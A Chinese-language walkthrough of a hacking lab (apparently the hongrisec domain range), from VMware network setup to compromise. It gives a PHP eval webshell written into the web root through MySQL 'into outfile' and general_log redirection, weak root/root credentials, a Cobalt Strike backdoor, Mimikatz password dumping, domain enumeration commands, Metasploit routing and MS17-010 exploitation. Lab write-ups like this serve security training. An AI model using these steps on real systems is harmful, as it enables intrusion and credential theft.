环境搭建

根据网络拓扑图看出，需要模拟内网和外网两个网段，win7虚拟机需要两张网卡。将网络适配器1设置为自定义，VMnet1（仅主机模式），网络适配器2设置为nat模式。

剩余两台机器均设置为VMnet1（仅主机模式）。

配置VMnet1网卡为192.168.52.xxx/24

开机验证，开机密码均为hongrisec@2019，win7可访问外网

最后打开phpstudy，模拟外网web站点

Win11物理机可以访问

至此环境搭建完成。

评估测试

官方给出的评估测试流程

外网打点

在web页面发现了，MySQL数据库测试，使用弱口令root root连接成功

但是并无卵用，使用dirsearch扫下目录，发现/phpmyadmin目录，Getshell方式很多，参考以下连接PHPMyAdmin后台

select @@basedir查看网站根目录，C:/phpStudy/MySQL/

尝试写入木马select '<?php @eval($_POST[cmd]);?>' into outfile 'C:/phpStudy/www/shell.php';

无法直接写入，尝试使用日志的方式写入木马，执行show variables like '%genaral%'

当general_log打开时，所执行的SQL语句都会出现在stu1.log中，如果修改genaral_log_file的值，则可以写入生成对应的文件中，首先打开general_log，set global general_log='on'

再修改路径，set global general_log_file='C:/phpStudy/www/shell.php'

成功修改，接下来写入木马select '<?php @eval($_POST[cmd]);?>'

蚁剑成功连接

内网探测

cobalt strike生成后门，使用蚁剑上传

使用终端运行后门，成功上线

简单信息收集，执行shell ipconfig

使用Mimikatz抓取密码

运行getsystem提权

域环境信息收集

shell ipconfig /all查看是否存在域

shell net view /domain查看有几个域

发现有俩

shell net group "domain controllers" /domain查看域控

net view查看ip，192.168.52.138

发现还有另一台主机，net group "domain computers" /domain，查看是否为域成员

信息收集完成，域控主机为192.168.52.138，另一个成员为192.168.52.141

内网横向

派生会话到MSF上

run post/multi/manage/autoroute查看当前机器所有网段信息

run post/multi/manage/autoroute SUBNET=192.168.52.0 ACTION=ADD添加路由

失败，因为路由已经存在了

首先使用background切换回后台，然后使用自带的auxiliary/scanner/portscan/tcp扫描域成员主机192.168.52.141开放的端口

135，139,445端口开放，同样的方法查看域控主机

利用ms17-010攻击

两台主机均存在永恒之蓝漏洞，接下来进行攻击

发现并没有拿到shell，猜测为Win7防火墙导致，返回Win7的会话关闭防火墙
